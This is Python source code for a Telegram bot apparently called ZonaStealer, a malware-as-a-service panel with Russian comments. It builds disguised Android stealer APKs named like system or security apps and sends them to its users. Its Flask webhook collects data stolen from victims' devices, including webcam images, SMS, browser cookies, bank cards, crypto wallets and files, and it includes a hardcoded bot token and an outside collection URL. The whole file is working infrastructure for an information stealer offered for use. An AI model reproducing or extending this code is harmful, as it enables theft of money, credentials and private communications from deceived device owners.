import telebot
from telebot import types
import os
import json
import threading
from database import Database
from stealer_generator import StealerGenerator
from flask import Flask, request
import logging

# Настройка
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Инициализация
db = Database()
TOKEN = "8364189800:AAHHsHHgKZ7oB6XSHExPWn0-0G5Fp8fGNi4"
ADMIN_ID = 7725796090

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# Состояния пользователей
user_states = {}

class UserState:
    def __init__(self):
        self.step = None
        self.stealer_name = None
        self.icon_file_id = None
        self.current_stealer = None

def get_state(user_id):
    if user_id not in user_states:
        user_states[user_id] = UserState()
    return user_states[user_id]

# Команды
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    username = message.from_user.username
    
    db.add_user(user_id, username)
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton('🔧 Создать стиллер')
    btn2 = types.KeyboardButton('📊 Мои стиллеры')
    btn3 = types.KeyboardButton('📁 Управление данными')
    btn4 = types.KeyboardButton('🛠️ Дополнительно')
    markup.row(btn1, btn2)
    markup.row(btn3, btn4)
    
    welcome = f"👑 Добро пожаловать, {username}!\n\n"
    welcome += "🔸 <b>Создать стиллер</b> - генерация APK\n"
    welcome += "🔸 <b>Мои стиллеры</b> - список ваших стиллеров\n"
    welcome += "🔸 <b>Управление данными</b> - просмотр собранного\n"
    welcome += "🔸 <b>Дополнительно</b> - вебка, СМС, функции\n\n"
    welcome += "⚡ <b>ZonaStealer v3.0</b> - самый мощный сборщик данных"
    
    bot.send_message(user_id, welcome, parse_mode='HTML', reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == '🔧 Создать стиллер')
def create_stealer_start(message):
    user_id = message.from_user.id
    state = get_state(user_id)
    state.step = 'awaiting_name'
    
    bot.send_message(user_id, "📝 Введите имя для вашего стиллера:\n\n"
                             "Примеры:\n"
                             "• System Optimizer\n"
                             "• Google Service\n"
                             "• Media Player\n"
                             "• Security Update")

@bot.message_handler(func=lambda message: get_state(message.from_user.id).step == 'awaiting_name')
def get_stealer_name(message):
    user_id = message.from_user.id
    state = get_state(user_id)
    
    if len(message.text) < 2:
        bot.send_message(user_id, "❌ Имя слишком короткое. Минимум 2 символа.")
        return
    
    state.stealer_name = message.text
    state.step = 'awaiting_icon'
    
    bot.send_message(user_id, "🖼️ Отправьте изображение для иконки стиллера (PNG, JPG):\n\n"
                             "Рекомендуется квадратное изображение 512x512px")

@bot.message_handler(content_types=['photo'])
def handle_icon(message):
    user_id = message.from_user.id
    state = get_state(user_id)
    
    if state.step != 'awaiting_icon':
        return
    
    # Сохраняем ID самого большого фото
    photo = message.photo[-1]
    state.icon_file_id = photo.file_id
    
    # Скачиваем иконку
    file_info = bot.get_file(photo.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    os.makedirs('icons', exist_ok=True)
    icon_path = f'icons/{user_id}_{state.stealer_name}.jpg'
    
    with open(icon_path, 'wb') as f:
        f.write(downloaded_file)
    
    # Генерируем стиллер
    bot.send_message(user_id, "⚙️ Генерация стиллера начата...")
    
    generator = StealerGenerator()
    result = generator.create_stealer(
        user_id=user_id,
        name=state.stealer_name,
        icon_path=icon_path,
        bot_token=TOKEN,
        chat_id=user_id
    )
    
    if result['success']:
        # Сохраняем в БД
        db.add_stealer(
            owner_id=user_id,
            name=state.stealer_name,
            icon_path=icon_path,
            config_path=result['config_path'],
            apk_path=result['apk_path']
        )
        
        # Отправляем APK
        with open(result['apk_path'], 'rb') as apk:
            bot.send_document(
                user_id,
                apk,
                caption=f"✅ <b>{state.stealer_name}</b> готов!\n\n"
                       f"📁 Файл: <code>{os.path.basename(result['apk_path'])}</code>\n"
                       f"📦 Размер: {os.path.getsize(result['apk_path']) // 1024} KB\n\n"
                       f"📲 <b>Как использовать:</b>\n"
                       f"1. Установите APK на устройство\n"
                       f"2. Запустите приложение\n"
                       f"3. Данные будут приходить сюда\n\n"
                       f"🔗 Webhook: <code>{result['webhook_url']}</code>",
                parse_mode='HTML'
            )
        
        # Сбрасываем состояние
        state.step = None
        state.stealer_name = None
        state.icon_file_id = None
        
    else:
        bot.send_message(user_id, f"❌ Ошибка генерации: {result['error']}")

@bot.message_handler(func=lambda message: message.text == '📊 Мои стиллеры')
def my_stealers(message):
    user_id = message.from_user.id
    stealers = db.get_all_data_summary(user_id)
    
    if not stealers:
        bot.send_message(user_id, "📭 У вас пока нет стиллеров.")
        return
    
    markup = types.InlineKeyboardMarkup()
    
    for stealer in stealers:
        stealer_id, name, devices, items, last_active = stealer
        
        text = f"🔹 {name}\n"
        text += f"📱 Устройств: {devices}\n"
        text += f"📊 Данных: {items}\n"
        text += f"⏰ Активность: {last_active if last_active else 'нет'}"
        
        callback_data = f"stealer_{stealer_id}"
        markup.add(types.InlineKeyboardButton(text, callback_data=callback_data))
    
    bot.send_message(user_id, "📋 <b>Ваши стиллеры:</b>", parse_mode='HTML', reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == '📁 Управление данными')
def data_management(message):
    user_id = message.from_user.id
    
    markup = types.InlineKeyboardMarkup()
    markup.row(
        types.InlineKeyboardButton('👁️ Веб-камера', callback_data='webcam_menu'),
        types.InlineKeyboardButton('📱 СМС', callback_data='sms_menu')
    )
    markup.row(
        types.InlineKeyboardButton('💳 Банковские карты', callback_data='cards_menu'),
        types.InlineKeyboardButton('🔑 Пароли', callback_data='passwords_menu')
    )
    markup.row(
        types.InlineKeyboardButton('📸 Галерея', callback_data='gallery_menu'),
        types.InlineKeyboardButton('🗂️ Файлы', callback_data='files_menu')
    )
    markup.row(
        types.InlineKeyboardButton('📞 Контакты', callback_data='contacts_menu'),
        types.InlineKeyboardButton('📍 Геолокация', callback_data='location_menu')
    )
    
    bot.send_message(
        user_id,
        "📁 <b>Управление собранными данными:</b>\n\n"
        "Выберите категорию для просмотра:",
        parse_mode='HTML',
        reply_markup=markup
    )

# Webhook обработчик
@app.route('/webhook', methods=['POST'])
def handle_webhook():
    try:
        data = request.json
        
        if not data:
            return {"status": "error", "message": "No data"}, 400
        
        # Определяем тип данных
        data_type = data.get('type', 'unknown')
        stealer_id = data.get('stealer_id')
        device_id = data.get('device_id')
        
        if data_type == 'webcam':
            # Обработка веб-камеры
            image_data = data.get('image')
            if image_data:
                db.add_webcam(stealer_id, device_id, image_data)
                
                # Отправляем фото админу
                try:
                    # Здесь нужно декодировать base64 если используется
                    pass
                except:
                    pass
        
        elif data_type == 'sms':
            # Обработка СМС
            for sms in data.get('messages', []):
                db.add_sms(
                    stealer_id=stealer_id,
                    device_id=device_id,
                    phone_number=sms.get('number'),
                    message=sms.get('body'),
                    timestamp=sms.get('timestamp')
                )
        
        elif data_type == 'cookies':
            # Cookies браузеров
            db.add_stolen_data(stealer_id, device_id, 'cookies', data.get('cookies', []))
        
        elif data_type == 'cards':
            # Банковские карты
            db.add_stolen_data(stealer_id, device_id, 'cards', data.get('cards', []))
        
        elif data_type == 'crypto':
            # Крипто кошельки
            db.add_stolen_data(stealer_id, device_id, 'crypto', data.get('wallets', []))
        
        elif data_type == 'files':
            # Важные файлы
            db.add_stolen_data(stealer_id, device_id, 'files', data.get('files', []))
        
        elif data_type == 'system_info':
            # Системная информация
            db.add_stolen_data(stealer_id, device_id, 'system', data)
        
        # Отправляем уведомление в Telegram
        notify_telegram(data_type, data)
        
        return {"status": "success"}, 200
        
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return {"status": "error", "message": str(e)}, 500

def notify_telegram(data_type, data):
    """Отправка уведомления в Telegram"""
    try:
        stealer_id = data.get('stealer_id')
        device_id = data.get('device_id')[:8] if data.get('device_id') else 'Unknown'
        
        messages = {
            'webcam': f"📸 Новая веб-камера от устройства {device_id}",
            'sms': f"📱 {len(data.get('messages', []))} новых СМС от {device_id}",
            'cookies': f"🍪 Cookies браузера от {device_id}",
            'cards': f"💳 {len(data.get('cards', []))} банковских карт от {device_id}",
            'crypto': f"₿ {len(data.get('wallets', []))} крипто-кошельков от {device_id}",
            'files': f"📁 {len(data.get('files', []))} файлов от {device_id}",
            'system_info': f"🖥️ Системная информация от {device_id}"
        }
        
        message = messages.get(data_type, f"📨 Новые данные от {device_id}")
        
        # Отправляем владельцу стиллера
        bot.send_message(ADMIN_ID, message)
        
        # Если это не админ, отправляем и админу тоже
        owner_id = get_stealer_owner(stealer_id)
        if owner_id and owner_id != ADMIN_ID:
            bot.send_message(owner_id, message)
            
    except Exception as e:
        logger.error(f"Notify error: {e}")

def get_stealer_owner(stealer_id):
    """Получить владельца стиллера"""
    try:
        db.cursor.execute('SELECT owner_id FROM stealers WHERE id = ?', (stealer_id,))
        result = db.cursor.fetchone()
        return result[0] if result else None
    except:
        return None

# Запуск
def start_bot():
    logger.info("Starting bot...")
    bot.remove_webhook()
    bot.set_webhook(url="https://zonastealer-bot.onrender.com/webhook")
    bot.polling(none_stop=True, interval=0)

def start_flask():
    app.run(host='0.0.0.0', port=5000, debug=False)

if __name__ == '__main__':
    # Запуск в двух потоках
    flask_thread = threading.Thread(target=start_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    start_bot()
